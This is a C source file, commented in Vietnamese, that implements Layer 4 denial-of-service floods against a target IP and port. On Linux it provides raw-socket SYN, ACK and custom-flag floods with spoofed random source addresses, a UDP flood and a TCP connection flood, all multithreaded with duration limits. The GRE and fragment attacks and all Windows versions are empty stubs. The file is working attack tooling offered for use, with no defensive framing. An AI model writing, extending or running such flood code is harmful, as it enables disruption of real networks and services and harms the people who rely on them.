/**
 * ddos_layer4.c
 * Trien khai cac ham DDoS Layer 4 (TCP/UDP)
 * Su dung raw socket de tao goi tin tuy chinh
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #define THREAD_HANDLE HANDLE
    #define THREAD_RETURN DWORD WINAPI
    #define THREAD_PARAM LPVOID
    #define SLEEP_MS(x) Sleep(x)
    #define CLOSE_SOCKET closesocket
    #define THREAD_CREATE(h, f, p) *h = CreateThread(NULL, 0, f, p, 0, NULL)
    #define THREAD_JOIN(h) WaitForSingleObject(h, INFINITE)
    #define THREAD_EXIT return 0
    #pragma comment(lib, "ws2_32.lib")
    
    /* Windows khong ho tro raw socket day du */
    #define KHONG_HO_TRO_RAW_SOCKET 1
#else
    #include <unistd.h>
    #include <pthread.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <netinet/ip.h>
    #include <netinet/tcp.h>
    #include <netinet/udp.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <errno.h>
    #define THREAD_HANDLE pthread_t
    #define THREAD_RETURN void*
    #define THREAD_PARAM void*
    #define SLEEP_MS(x) usleep((x) * 1000)
    #define CLOSE_SOCKET close
    #define THREAD_CREATE(h, f, p) pthread_create(h, NULL, f, p)
    #define THREAD_JOIN(h) pthread_join(h, NULL)
    #define THREAD_EXIT return NULL
#endif

#include "ddos_layer4.h"

/* Cau truc IP header */
struct ip_header {
    uint8_t  version_ihl;    /* 4-bit version + 4-bit IHL */
    uint8_t  tos;            /* Type of Service */
    uint16_t total_length;   /* Tong chieu dai */
    uint16_t identification; /* ID phan manh */
    uint16_t flags_offset;   /* Co + offset */
    uint8_t  ttl;            /* Time to Live */
    uint8_t  protocol;       /* Giao thuc (TCP=6, UDP=17) */
    uint16_t checksum;       /* Checksum IP header */
    uint32_t src_addr;       /* IP nguon */
    uint32_t dst_addr;       /* IP dich */
};

/* Cau truc TCP header */
struct tcp_header {
    uint16_t src_port;       /* Cong nguon */
    uint16_t dst_port;       /* Cong dich */
    uint32_t seq_number;     /* So thu tu */
    uint32_t ack_number;     /* So bao nhan */
    uint16_t data_offset;    /* Data offset + Reserved + Flags */
    uint16_t window;         /* Kich thuoc cua so */
    uint16_t checksum;       /* Checksum TCP */
    uint16_t urg_pointer;    /* Con tro khan cap */
};

/* Cau truc UDP header */
struct udp_header {
    uint16_t src_port;       /* Cong nguon */
    uint16_t dst_port;       /* Cong dich */
    uint16_t length;         /* Chieu dai */
    uint16_t checksum;       /* Checksum */
};

/* Cau truc pseudo header cho TCP/UDP checksum */
struct pseudo_header {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t  reserved;
    uint8_t  protocol;
    uint16_t tcp_length;
};

/* Cau truc tham so cho thread */
typedef struct {
    char ip_muc_tieu[64];
    int cong;
    int kich_thuoc_goi;
    int thoi_gian;
    volatile int* dem_goi;
    volatile int* dang_chay;
    char co_flags[16];
} ThamSoThreadL4;

/**
 * Tinh checksum (RFC 1071)
 */
static uint16_t tinh_checksum(void* data, size_t length) {
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)data;
    
    while (length > 1) {
        sum += *ptr++;
        length -= 2;
    }
    
    if (length > 0) {
        sum += *(uint8_t*)ptr;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return (uint16_t)(~sum);
}

/**
 * Tao IP nguon ngau nhien
 */
static uint32_t tao_ip_ngau_nhien(void) {
    uint8_t byte1 = (rand() % 254) + 1;
    uint8_t byte2 = (rand() % 255);
    uint8_t byte3 = (rand() % 255);
    uint8_t byte4 = (rand() % 254) + 1;
    
    /* Tranh IP private */
    if (byte1 == 10) byte1 = 11;
    if (byte1 == 172 && byte2 >= 16 && byte2 <= 31) byte1 = 173;
    if (byte1 == 192 && byte2 == 168) byte1 = 193;
    if (byte1 == 127) byte1 = 128;
    if (byte1 >= 224) byte1 = 223;
    
    return (byte1 << 24) | (byte2 << 16) | (byte3 << 8) | byte4;
}

#ifndef KHONG_HO_TRO_RAW_SOCKET
/* ==================== LINUX RAW SOCKET ==================== */

/**
 * SYN Flood thread (Linux)
 */
static THREAD_RETURN thread_syn_flood(THREAD_PARAM param) {
    ThamSoThreadL4* ts = (ThamSoThreadL4*)param;
    
    /* Tao raw socket */
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("raw socket");
        THREAD_EXIT;
    }
    
    /* Bat IP_HDRINCL de tu tao IP header */
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("IP_HDRINCL");
        CLOSE_SOCKET(sock);
        THREAD_EXIT;
    }
    
    /* Chuan bi dia chi dich */
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(ts->cong);
    inet_pton(AF_INET, ts->ip_muc_tieu, &dest_addr.sin_addr);
    
    /* Buffer cho goi tin */
    char packet[4096];
    memset(packet, 0, sizeof(packet));
    
    struct ip_header* ip = (struct ip_header*)packet;
    struct tcp_header* tcp = (struct tcp_header*)(packet + sizeof(struct ip_header));
    
    /* Cau hinh IP header */
    ip->version_ihl = 0x45;       /* Version 4, IHL 5 */
    ip->tos = 0;
    ip->identification = htons(rand() % 65535);
    ip->flags_offset = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    
    /* Cau hinh TCP header */
    int header_len = sizeof(struct ip_header) + sizeof(struct tcp_header);
    
    time_t thoi_gian_bat_dau = time(NULL);
    
    while (*(ts->dang_chay)) {
        if (ts->thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= ts->thoi_gian) break;
        
        /* Tao IP nguon ngau nhien */
        ip->src_addr = tao_ip_ngau_nhien();
        ip->dst_addr = dest_addr.sin_addr.s_addr;
        ip->total_length = htons(header_len);
        ip->checksum = 0;
        ip->checksum = tinh_checksum(ip, sizeof(struct ip_header));
        
        /* Cau hinh TCP header */
        tcp->src_port = htons(rand() % 65535 + 1);
        tcp->dst_port = htons(ts->cong);
        tcp->seq_number = htonl(rand());
        tcp->ack_number = 0;
        tcp->data_offset = 0x50;  /* Data offset = 5 (20 bytes) */
        tcp->window = htons(65535);
        tcp->checksum = 0;
        tcp->urg_pointer = 0;
        
        /* Dat co SYN */
        tcp->data_offset |= 0x02; /* SYN flag */
        
        /* Tinh TCP checksum voi pseudo header */
        struct pseudo_header psh;
        psh.src_addr = ip->src_addr;
        psh.dst_addr = ip->dst_addr;
        psh.reserved = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcp_header));
        
        char checksum_buffer[4096];
        memcpy(checksum_buffer, &psh, sizeof(psh));
        memcpy(checksum_buffer + sizeof(psh), tcp, sizeof(struct tcp_header));
        tcp->checksum = tinh_checksum(checksum_buffer, sizeof(psh) + sizeof(struct tcp_header));
        
        /* Gui goi tin */
        sendto(sock, packet, header_len, 0, 
               (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        
        (*(ts->dem_goi))++;
        
        /* Ngu mot chut de tranh qua tai CPU */
        if (*(ts->dem_goi) % 1000 == 0) {
            SLEEP_MS(1);
        }
    }
    
    CLOSE_SOCKET(sock);
    THREAD_EXIT;
}

/**
 * SYN Flood chinh
 */
int syn_flood(const char* ip_muc_tieu, int cong, int so_thread, int thoi_gian) {
    volatile int dem_goi = 0;
    volatile int dang_chay = 1;
    
    ThamSoThreadL4 ts;
    strncpy(ts.ip_muc_tieu, ip_muc_tieu, sizeof(ts.ip_muc_tieu) - 1);
    ts.cong = cong;
    ts.thoi_gian = thoi_gian;
    ts.dem_goi = &dem_goi;
    ts.dang_chay = &dang_chay;
    
    pthread_t* threads = (pthread_t*)malloc(sizeof(pthread_t) * so_thread);
    if (threads == NULL) return 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_create(&threads[i], NULL, thread_syn_flood, &ts);
    }
    
    if (thoi_gian > 0) {
        sleep(thoi_gian);
    } else {
        sleep(30);
    }
    
    dang_chay = 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    return dem_goi;
}

/**
 * ACK Flood
 */
int ack_flood(const char* ip_muc_tieu, int cong, int so_thread, int thoi_gian) {
    volatile int dem_goi = 0;
    volatile int dang_chay = 1;
    
    ThamSoThreadL4 ts;
    strncpy(ts.ip_muc_tieu, ip_muc_tieu, sizeof(ts.ip_muc_tieu) - 1);
    ts.cong = cong;
    ts.thoi_gian = thoi_gian;
    ts.dem_goi = &dem_goi;
    ts.dang_chay = &dang_chay;
    
    /* Su dung raw socket tuong tu SYN flood nhung voi co ACK */
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return 0;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(cong);
    inet_pton(AF_INET, ip_muc_tieu, &dest_addr.sin_addr);
    
    char packet[4096];
    memset(packet, 0, sizeof(packet));
    
    struct ip_header* ip = (struct ip_header*)packet;
    struct tcp_header* tcp = (struct tcp_header*)(packet + sizeof(struct ip_header));
    
    ip->version_ihl = 0x45;
    ip->tos = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    
    int header_len = sizeof(struct ip_header) + sizeof(struct tcp_header);
    
    time_t thoi_gian_bat_dau = time(NULL);
    
    while (dang_chay) {
        if (thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= thoi_gian) break;
        
        ip->src_addr = tao_ip_ngau_nhien();
        ip->dst_addr = dest_addr.sin_addr.s_addr;
        ip->total_length = htons(header_len);
        ip->identification = htons(rand() % 65535);
        ip->checksum = 0;
        ip->checksum = tinh_checksum(ip, sizeof(struct ip_header));
        
        tcp->src_port = htons(rand() % 65535 + 1);
        tcp->dst_port = htons(cong);
        tcp->seq_number = htonl(rand());
        tcp->ack_number = htonl(rand());
        tcp->data_offset = 0x50;
        tcp->window = htons(65535);
        tcp->checksum = 0;
        tcp->urg_pointer = 0;
        tcp->data_offset |= 0x10; /* ACK flag */
        
        struct pseudo_header psh;
        psh.src_addr = ip->src_addr;
        psh.dst_addr = ip->dst_addr;
        psh.reserved = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcp_header));
        
        char checksum_buffer[4096];
        memcpy(checksum_buffer, &psh, sizeof(psh));
        memcpy(checksum_buffer + sizeof(psh), tcp, sizeof(struct tcp_header));
        tcp->checksum = tinh_checksum(checksum_buffer, sizeof(psh) + sizeof(struct tcp_header));
        
        sendto(sock, packet, header_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        dem_goi++;
    }
    
    CLOSE_SOCKET(sock);
    return dem_goi;
}

/**
 * UDP Flood
 */
static THREAD_RETURN thread_udp_flood(THREAD_PARAM param) {
    ThamSoThreadL4* ts = (ThamSoThreadL4*)param;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) THREAD_EXIT;
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(ts->cong);
    inet_pton(AF_INET, ts->ip_muc_tieu, &dest_addr.sin_addr);
    
    /* Tao buffer ngau nhien */
    int buffer_size = ts->kich_thuoc_goi;
    if (buffer_size <= 0 || buffer_size > 65507) buffer_size = 1024;
    
    char* buffer = (char*)malloc(buffer_size);
    if (buffer == NULL) {
        CLOSE_SOCKET(sock);
        THREAD_EXIT;
    }
    
    /* Dien buffer voi du lieu ngau nhien */
    for (int i = 0; i < buffer_size; i++) {
        buffer[i] = (char)(rand() % 256);
    }
    
    time_t thoi_gian_bat_dau = time(NULL);
    
    while (*(ts->dang_chay)) {
        if (ts->thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= ts->thoi_gian) break;
        
        sendto(sock, buffer, buffer_size, 0, 
               (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        
        (*(ts->dem_goi))++;
        
        if (*(ts->dem_goi) % 1000 == 0) {
            SLEEP_MS(1);
        }
    }
    
    free(buffer);
    CLOSE_SOCKET(sock);
    THREAD_EXIT;
}

int udp_flood(const char* ip_muc_tieu, int cong, int kich_thuoc_goi,
              int so_thread, int thoi_gian) {
    volatile int dem_goi = 0;
    volatile int dang_chay = 1;
    
    ThamSoThreadL4 ts;
    strncpy(ts.ip_muc_tieu, ip_muc_tieu, sizeof(ts.ip_muc_tieu) - 1);
    ts.cong = cong;
    ts.kich_thuoc_goi = kich_thuoc_goi;
    ts.thoi_gian = thoi_gian;
    ts.dem_goi = &dem_goi;
    ts.dang_chay = &dang_chay;
    
    pthread_t* threads = (pthread_t*)malloc(sizeof(pthread_t) * so_thread);
    if (threads == NULL) return 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_create(&threads[i], NULL, thread_udp_flood, &ts);
    }
    
    if (thoi_gian > 0) {
        sleep(thoi_gian);
    } else {
        sleep(30);
    }
    
    dang_chay = 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    return dem_goi;
}

int tcp_connection_flood(const char* ip_muc_tieu, int cong, int so_thread, int thoi_gian) {
    volatile int dem_ket_noi = 0;
    volatile int dang_chay = 1;
    int* sockets = (int*)malloc(sizeof(int) * so_thread * 2);
    int socket_count = 0;
    
    time_t thoi_gian_bat_dau = time(NULL);
    
    while (dang_chay) {
        if (thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= thoi_gian) break;
        
        if (socket_count < so_thread * 2) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock >= 0) {
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(cong);
                inet_pton(AF_INET, ip_muc_tieu, &addr.sin_addr);
                
                /* Dat non-blocking */
                fcntl(sock, F_SETFL, O_NONBLOCK);
                
                connect(sock, (struct sockaddr*)&addr, sizeof(addr));
                sockets[socket_count++] = sock;
                dem_ket_noi++;
            }
        }
        
        SLEEP_MS(10);
    }
    
    for (int i = 0; i < socket_count; i++) {
        CLOSE_SOCKET(sockets[i]);
    }
    free(sockets);
    return dem_ket_noi;
}

int tcp_flag_attack(const char* ip_muc_tieu, int cong, const char* co_flags,
                    int so_thread, int thoi_gian) {
    volatile int dem_goi = 0;
    volatile int dang_chay = 1;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return 0;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(cong);
    inet_pton(AF_INET, ip_muc_tieu, &dest_addr.sin_addr);
    
    /* Parse flags */
    uint8_t flags = 0;
    if (strstr(co_flags, "SYN")) flags |= 0x02;
    if (strstr(co_flags, "ACK")) flags |= 0x10;
    if (strstr(co_flags, "FIN")) flags |= 0x01;
    if (strstr(co_flags, "RST")) flags |= 0x04;
    if (strstr(co_flags, "PSH")) flags |= 0x08;
    if (strstr(co_flags, "URG")) flags |= 0x20;
    if (flags == 0) flags = 0x02; /* Mac dinh SYN */
    
    char packet[4096];
    memset(packet, 0, sizeof(packet));
    
    struct ip_header* ip = (struct ip_header*)packet;
    struct tcp_header* tcp = (struct tcp_header*)(packet + sizeof(struct ip_header));
    
    ip->version_ihl = 0x45;
    ip->tos = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    
    int header_len = sizeof(struct ip_header) + sizeof(struct tcp_header);
    
    time_t thoi_gian_bat_dau = time(NULL);
    
    while (dang_chay) {
        if (thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= thoi_gian) break;
        
        ip->src_addr = tao_ip_ngau_nhien();
        ip->dst_addr = dest_addr.sin_addr.s_addr;
        ip->total_length = htons(header_len);
        ip->identification = htons(rand() % 65535);
        ip->checksum = 0;
        ip->checksum = tinh_checksum(ip, sizeof(struct ip_header));
        
        tcp->src_port = htons(rand() % 65535 + 1);
        tcp->dst_port = htons(cong);
        tcp->seq_number = htonl(rand());
        tcp->ack_number = htonl(rand());
        tcp->data_offset = 0x50 | (flags & 0x3F);
        tcp->window = htons(65535);
        tcp->checksum = 0;
        tcp->urg_pointer = 0;
        
        struct pseudo_header psh;
        psh.src_addr = ip->src_addr;
        psh.dst_addr = ip->dst_addr;
        psh.reserved = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcp_header));
        
        char checksum_buffer[4096];
        memcpy(checksum_buffer, &psh, sizeof(psh));
        memcpy(checksum_buffer + sizeof(psh), tcp, sizeof(struct tcp_header));
        tcp->checksum = tinh_checksum(checksum_buffer, sizeof(psh) + sizeof(struct tcp_header));
        
        sendto(sock, packet, header_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        dem_goi++;
    }
    
    CLOSE_SOCKET(sock);
    return dem_goi;
}

int gre_flood(const char* ip_muc_tieu, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu;
    (void)so_thread;
    (void)thoi_gian;
    return 0;
}

int ip_fragment_attack(const char* ip_muc_tieu, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu;
    (void)so_thread;
    (void)thoi_gian;
    return 0;
}

#else
/* ==================== WINDOWS STUB ==================== */

int syn_flood(const char* ip_muc_tieu, int cong, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)cong; (void)so_thread; (void)thoi_gian;
    return 0;
}

int ack_flood(const char* ip_muc_tieu, int cong, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)cong; (void)so_thread; (void)thoi_gian;
    return 0;
}

int tcp_connection_flood(const char* ip_muc_tieu, int cong, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)cong; (void)so_thread; (void)thoi_gian;
    return 0;
}

int udp_flood(const char* ip_muc_tieu, int cong, int kich_thuoc_goi,
              int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)cong; (void)kich_thuoc_goi; (void)so_thread; (void)thoi_gian;
    return 0;
}

int tcp_flag_attack(const char* ip_muc_tieu, int cong, const char* co_flags,
                    int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)cong; (void)co_flags; (void)so_thread; (void)thoi_gian;
    return 0;
}

int gre_flood(const char* ip_muc_tieu, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)so_thread; (void)thoi_gian;
    return 0;
}

int ip_fragment_attack(const char* ip_muc_tieu, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)so_thread; (void)thoi_gian;
    return 0;
}

#endif /* KHONG_HO_TRO_RAW_SOCKET */